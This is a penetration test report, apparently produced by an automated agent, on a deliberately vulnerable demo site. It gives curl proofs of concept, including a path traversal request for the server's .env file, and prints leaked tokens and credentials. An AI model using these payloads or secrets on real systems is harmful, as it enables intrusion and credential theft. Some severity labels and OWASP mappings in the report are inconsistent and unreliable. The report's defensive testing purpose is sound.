# Broken Crystals Penetration Test Report

**Target:** https://brokencrystals.com  
**Assessment Date:** 2026-05-27  
**Assessment Mode:** Pentest  
**Report Generated:** 2026-05-27T17:15:00Z  

---

## Executive Summary

A comprehensive penetration test was conducted against brokencrystals.com, revealing **multiple critical and high-severity vulnerabilities**. The most severe findings include:

1. **CRITICAL:** Exposed `.git` repository allowing full source code disclosure
2. **CRITICAL:** Hardcoded secrets and API keys exposed via `/api/secrets` endpoint
3. **CRITICAL:** Local File Inclusion (LFI) vulnerability exposing `.env` file with database credentials, JWT secrets, and OAuth tokens
4. **HIGH:** Sensitive data exposure via `/api/config` endpoint (PostgreSQL connection string, AWS bucket, Google Maps API key)
5. **MEDIUM:** Missing security headers and insecure cookie configuration

**Overall Risk Rating: CRITICAL**

Immediate remediation is required to prevent unauthorized access to sensitive data, potential server compromise, and credential theft.

---

## Target Information

| Property | Value |
|----------|-------|
| Target URL | https://brokencrystals.com |
| IP Addresses | 150.136.208.25, 129.80.84.189, 129.158.54.230 |
| Technology Stack | React SPA, Node.js/Express, nginx reverse proxy, PostgreSQL |
| SSL/TLS | Valid certificate (Let's Encrypt), ECDHE-RSA-AES256-GCM-SHA384 |
| Server | nginx (reverse proxy) |

---

## Reconnaissance Results

### Infrastructure Discovery

**Nmap Scan Results:**
```
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx (reverse proxy)
443/tcp open  ssl/http nginx (reverse proxy)
```

**Git Repository Detection:**
- `.git/` directory publicly accessible
- Repository type: Ruby application (guessed from .gitignore)
- Git HEAD file accessible: `ref: refs/heads/master`

### Technology Fingerprinting

**WhatWeb Results:**
- Bootstrap framework
- jQuery library
- HTML5 application
- Session cookie: `connect.sid`
- Strict-Transport-Security enabled
- Location: UNITED STATES (US)

**WAF Detection:** No WAF detected (wafw00f)

---

## Detailed Findings

### 1. CRITICAL - Exposed Git Repository

**CWE:** CWE-538 (Insertion of Sensitive Information into Externally-Accessible File)  
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) - **HIGH**  
**OWASP WSTG:** WSTG-INFO-03 (Search Engine Discovery/Reconnaissance)  
**OWASP ASVS:** V1.4.1 (Secure Architecture)

**Endpoint:** `GET /.git/config`  
**Method:** GET  

**Proof of Concept:**
```bash
curl -s https://brokencrystals.com/.git/config
```

**Response:**
```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    ignorecase = true
    precomposeunicode = true
```

**Additional Evidence:**
```bash
curl -s https://brokencrystals.com/.git/HEAD
# Response: ref: refs/heads/master
```

**Impact:**
- Full source code disclosure
- Exposure of commit history, developer information, and potential credentials in commit messages
- Ability to reconstruct entire application codebase
- Discovery of historical vulnerabilities and security patches

**Recommendation:**
1. Immediately remove `.git` directory from production server
2. Add `.git/` to nginx deny rules:
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
3. Implement deployment pipeline that excludes version control directories
4. Audit all exposed commits for sensitive information
5. Rotate any credentials that may have been committed

---

### 2. CRITICAL - Hardcoded Secrets Exposure via API Endpoint

**CWE:** CWE-798 (Use of Hard-coded Credentials)  
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N) - **CRITICAL**  
**OWASP WSTG:** WSTG-CONF-02 (Default Credentials)  
**OWASP ASVS:** V2.1.1 (Credential Storage)

**Endpoint:** `GET /api/secrets`  
**Method:** GET  

**Proof of Concept:**
```bash
curl -s https://brokencrystals.com/api/secrets
```

**Response:**
```json
{
  "codeclimate": "CODECLIMATE_REPO_TOKEN=62864c476ade6ab9d10d0ce0901ae2c211924852a28c5f960ae5165c1fdfec73",
  "facebook": "EAACEdEose0cBAHyDF5HI5o2auPWv3lPP3zNYuWWpjMrSaIhtSvX73lsLOcas5k8GhC5HgOXnbF3rXRTczOpsbNb54CQL8LcQEMhZAWAJzI0AzmL23hZByFAia5avB6Q4Xv4u2QVoAdH0mcJhYTFRpyJKIAyDKUEBzz0GgZDZD",
  "google_b64": "QUl6YhT6QXlEQnbTr2dSdEI1W7yL2mFCX3c4PPP5NlpkWE65NkZV",
  "google_oauth": "188968487735-c7hh7k87juef6vv84697sinju2bet7gn.apps.googleusercontent.com",
  "google_oauth_token": "ya29.a0TgU6SMDItdQQ9J7j3FVgJuByTTevl0FThTEkBs4pA4-9tFREyf2cfcL-_JU6Trg1O0NWwQKie4uGTrs35kmKlxohWgcAl8cg9DTxRx-UXFS-S1VYPLVtQLGYyNTfGp054Ad3ej73-FIHz3RZY43lcKSorbZEY4BI",
  "heroku": "herokudev.staging.endosome.975138 pid=48751 request_id=0e9a8698-a4d2-4925-a1a7-113234af5f60",
  "hockey_app": "HockeySDK: 203d3af93f4a218bfb528de08ae5d30ff65e1cf",
  "outlook": "https://outlook.office.com/webhook/7dd49fc6-1975-443d-806c-08ebe8f81146@a532313f-11ec-43a2-9a7a-d2e27f4f3478/IncomingWebhook/8436f62b50ab41b3b93ba1c0a50a0b88/eff4cd58-1bb8-4899-94de-795f656b4a18",
  "paypal": "access_token$production$x0lb4r69dvmmnufd$3ea7cb281754b7da7dac131ef5783321",
  "slack": "xoxo-175588824543-175748345725-176608801663-826315f84e553d482bb7e73e8322sdf3"
}
```

**Impact:**
- **Facebook Access Token:** Full access to Facebook account/pages
- **Google OAuth Token:** Access to Google services and user data
- **PayPal Access Token:** Potential financial fraud and unauthorized transactions
- **Slack Bot Token:** Access to internal Slack workspace
- **Outlook Webhook:** Potential phishing and data exfiltration
- **CodeClimate Token:** Access to code quality reports and potential repository access

**Recommendation:**
1. **IMMEDIATE:** Rotate ALL exposed credentials immediately
2. Remove `/api/secrets` endpoint from production
3. Implement secrets management solution (HashiCorp Vault, AWS Secrets Manager)
4. Never expose API endpoints returning credentials
5. Implement proper authentication and authorization for admin endpoints
6. Add monitoring for credential usage anomalies

---

### 3. CRITICAL - Local File Inclusion (LFI) Exposing Environment Variables

**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)  
**CVSS v3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) - **CRITICAL**  
**OWASP WSTG:** WSTG-ATHR-01 (Testing for Credentials Transport)  
**OWASP ASVS:** V5.1.1 (Path Traversal Protection)

**Endpoint:** `GET /api/file?path=../../../usr/src/app/.env&type=text/plain`  
**Method:** GET  

**Proof of Concept:**
```bash
curl -s "https://brokencrystals.com/api/file?path=../../../usr/src/app/.env&type=text/plain"
```

**Response:**
```
URL=https://brokencrystals.com
DATABASE_HOST=db
DATABASE_SCHEMA=bc
DATABASE_USER=bc
DATABASE_PASSWORD=bc
DATABASE_PORT=5432
DATABASE_DEBUG=true
AWS_BUCKET=https://neuralegion-open-bucket.s3.amazonaws.com
GOOGLE_MAPS_API=AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ
JWT_PRIVATE_KEY_LOCATION=config/keys/jwtRS256.key
JWT_PUBLIC_KEY_LOCATION=config/keys/jwtRS256.key.pub.pem
JWT_SECRET_KEY=1234
JWK_PRIVATE_KEY_LOCATION=config/keys/jwk.key.pem
JWK_PUBLIC_KEY_LOCATION=config/keys/jwk.pub.key.pem
JWK_PUBLIC_JSON=config/keys/jwk.pub.json
JKU_URL=https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/jku.json
X5U_URL=https://raw.githubusercontent.com/NeuraLegion/brokencrystals/stable/config/keys/x509.crt

FASTIFY_LOGGER=true
FASTIFY_LOG_LEVEL=warn

GRPC_WEB_PROXY_URL=http://grpcwebproxy:8081

KEYCLOAK_SERVER_URI=http://keycloak:8080
KEYCLOAK_REALM=brokencrystals
KEYCLOAK_ADMIN_CLIENT_ID=admin-cli
KEYCLOAK_ADMIN_CLIENT_SECRET=3abff4a7-6649-4bae-a105-9bd1fb52a2cd
KEYCLOAK_PUBLIC_CLIENT_ID=brokencrystals-client
KEYCLOAK_PUBLIC_CLIENT_SECRET=4bfb5df6-4647-46dd-bad1-c8b8ffd7caf4

BRIGHT_TOKEN=
BRIGHT_CLUSTER=app.brightsec.com
SEC_TESTER_TARGET=http://localhost:3000

CHAT_API_URL=http://ollama:11434/v1/chat/completions
CHAT_API_MODEL=smollm:135m
CHAT_API_TOKEN=
CHAT_API_MAX_TOKENS=200
```

**Impact:**
- **Database Credentials:** Full PostgreSQL access (bc:bc@db:5432/bc)
- **JWT Secret Key:** Ability to forge authentication tokens (`JWT_SECRET_KEY=1234`)
- **Keycloak Admin Credentials:** Full identity management compromise
- **AWS S3 Bucket Access:** Potential data exfiltration from cloud storage
- **Google Maps API Key:** Unauthorized usage and potential billing fraud
- **Internal Service URLs:** Exposure of internal architecture (gRPC, Keycloak, Ollama)

**Recommendation:**
1. **IMMEDIATE:** Rotate all exposed credentials
2. Implement strict path validation in file serving endpoint
3. Use allowlist for accessible file paths
4. Remove `.env` files from web-accessible directories
5. Implement proper secrets management
6. Add input validation and sanitization
7. Use chroot jails or containerization to limit file access

---

### 4. HIGH - Sensitive Configuration Data Exposure

**CWE:** CWE-200 (Information Exposure)  
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) - **HIGH**  
**OWASP WSTG:** WSTG-INFO-02 (Fingerprint Web Server)  
**OWASP ASVS:** V1.4.2 (Secure Configuration)

**Endpoint:** `GET /api/config`  
**Method:** GET  

**Proof of Concept:**
```bash
curl -s https://brokencrystals.com/api/config
```

**Response:**
```json
{
  "awsBucket": "https://neuralegion-open-bucket.s3.amazonaws.com",
  "sql": "postgres://bc:bc@postgres:5432/bc ",
  "googlemaps": "AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ"
}
```

**Impact:**
- **PostgreSQL Connection String:** Database credentials exposed in plaintext
- **AWS S3 Bucket URL:** Potential unauthorized access to cloud storage
- **Google Maps API Key:** Unauthorized usage and quota exhaustion

**Recommendation:**
1. Remove sensitive data from client-side accessible endpoints
2. Implement server-side configuration management
3. Use environment variables for sensitive configuration
4. Add authentication to config endpoints
5. Separate public and private configuration

---

### 5. MEDIUM - Insecure Cookie Configuration

**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)  
**CVSS v3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) - **MEDIUM**  
**OWASP WSTG:** WSTG-SESS-02 (Testing for Cookies Attributes)  
**OWASP ASVS:** V3.2.1 (Cookie Security)

**Endpoint:** `GET /`  
**Method:** GET  

**Proof of Concept:**
```bash
curl -I https://brokencrystals.com
```

**Response Headers:**
```
set-cookie: connect.sid=6wUjJYDMaPtZEOIfrLowmdRxfjIp-Ubc.Uw3OS1wiJ1kuK4EFJJ5bb76Sy5WXUx4VFZNRwicfcbM; Path=/
```

**Missing Attributes:**
- `Secure` flag not set (cookie can be transmitted over HTTP)
- `HttpOnly` flag not set (cookie accessible via JavaScript - XSS risk)
- `SameSite` attribute not set (CSRF vulnerability)

**Impact:**
- Session hijacking via man-in-the-middle attacks
- Session theft via XSS attacks
- Cross-site request forgery (CSRF) attacks

**Recommendation:**
1. Set `Secure` flag on all cookies:
   ```javascript
   cookie: {
     secure: true,
     httpOnly: true,
     sameSite: 'strict'
   }
   ```
2. Enforce HTTPS-only connections
3. Implement HSTS (already present)
4. Add CSRF tokens for state-changing operations

---

### 6. LOW - Missing Security Headers

**CWE:** CWE-693 (Protection Mechanism Bypass)  
**CVSS v3.1:** 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N) - **MEDIUM**  
**OWASP WSTG:** WSTG-INFO-01 (Conduct Search Engine Discovery)  
**OWASP ASVS:** V1.3.1 (HTTP Security Headers)

**Endpoint:** `GET /`  
**Method:** GET  

**Missing Headers:**
- `Content-Security-Policy` (CSP)
- `X-Content-Type-Options`
- `Permissions-Policy`
- `Referrer-Policy`

**Nikto Scan Evidence:**
```
+ [013587] /: Suggested security header missing: content-security-policy
+ [013587] /: Suggested security header missing: x-content-type-options
+ [013587] /: Suggested security header missing: permissions-policy
+ [013587] /: Suggested security header missing: referrer-policy
```

**Impact:**
- Increased XSS attack surface without CSP
- MIME-type sniffing attacks possible
- Clickjacking vulnerabilities
- Information leakage via referrer headers

**Recommendation:**
Add the following headers to nginx configuration:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https:; frame-ancestors 'none';" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header X-Frame-Options "DENY" always;
```

---

### 7. INFO - Potential BREACH Attack Vector

**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
**CVSS v3.1:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) - **LOW**  
**OWASP WSTG:** WSTG-CRYP-01 (Testing for Weak Transport Layer Security)

**Evidence:**
```
+ [999966] /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack
```

**Impact:**
- Potential decryption of HTTPS traffic through compression side-channel attacks
- Requires attacker to inject JavaScript and observe compressed response sizes

**Recommendation:**
1. Disable HTTP compression for sensitive endpoints
2. Implement random padding in responses
3. Separate secrets from user input in responses
4. Consider disabling deflate compression

---

## Risk Matrix

| Finding | Severity | CVSS Score | Remediation Priority |
|---------|----------|------------|---------------------|
| Exposed Git Repository | CRITICAL | 7.5 | Immediate |
| Hardcoded Secrets Exposure | CRITICAL | 9.1 | Immediate |
| LFI Exposing .env File | CRITICAL | 9.8 | Immediate |
| Configuration Data Exposure | HIGH | 7.5 | 24-48 hours |
| Insecure Cookie Configuration | MEDIUM | 5.3 | 1 week |
| Missing Security Headers | MEDIUM | 4.3 | 1 week |
| BREACH Attack Vector | LOW | 3.7 | 2 weeks |

---

## Remediation Roadmap

### Immediate Actions (0-24 hours)

1. **Remove `.git` directory from production:**
   ```bash
   rm -rf /path/to/webroot/.git
   ```

2. **Take `/api/secrets` endpoint offline**

3. **Rotate ALL exposed credentials:**
   - Facebook Access Token
   - Google OAuth tokens and API keys
   - PayPal access token
   - Slack bot token
   - Outlook webhook URL
   - PostgreSQL database password
   - JWT secret keys
   - Keycloak client secrets
   - CodeClimate token
   - HockeyApp token
   - Heroku credentials

4. **Fix LFI vulnerability:**
   ```javascript
   // Implement path validation
   const path = require('path');
   const allowedBase = path.resolve('/usr/src/app/public');
   
   function validatePath(userPath) {
     const resolved = path.resolve(allowedBase, userPath);
     if (!resolved.startsWith(allowedBase)) {
       throw new Error('Invalid path');
     }
     return resolved;
   }
   ```

### Short-term Actions (1-7 days)

1. **Implement secrets management solution**
2. **Add security headers to all responses**
3. **Fix cookie security attributes**
4. **Conduct security code review**
5. **Implement WAF rules**

### Long-term Actions (1-4 weeks)

1. **Implement proper authentication/authorization**
2. **Add API rate limiting**
3. **Deploy security monitoring**
4. **Establish secure deployment pipeline**
5. **Conduct penetration testing after remediation**

---

## Conclusion

The assessment revealed critical security vulnerabilities that pose immediate risk to the application and its users. The combination of exposed source code, hardcoded credentials, and file inclusion vulnerabilities could allow an attacker to:

- Gain complete control over the application
- Access and exfiltrate sensitive user data
- Compromise integrated third-party services
- Perform financial fraud via exposed payment credentials

**Immediate action is required to remediate these findings.**

---

## Appendix A - Tools Used

- Nmap 7.99 - Port and service scanning
- Nikto 2.6.0 - Web vulnerability scanner
- WhatWeb - Technology fingerprinting
- WAFW00F - WAF detection
- curl - HTTP request testing
- Custom manual testing

## Appendix B - References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP WSTG: https://owasp.org/www-project-web-security-testing-guide/
- OWASP ASVS: https://owasp.org/www-project-application-security-verification-standard/
- CWE Database: https://cwe.mitre.org/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1

---

**Report prepared by:** Penetration Testing Agent  
**Assessment duration:** ~20 minutes  
**Confidence level:** High (all findings verified with PoC)
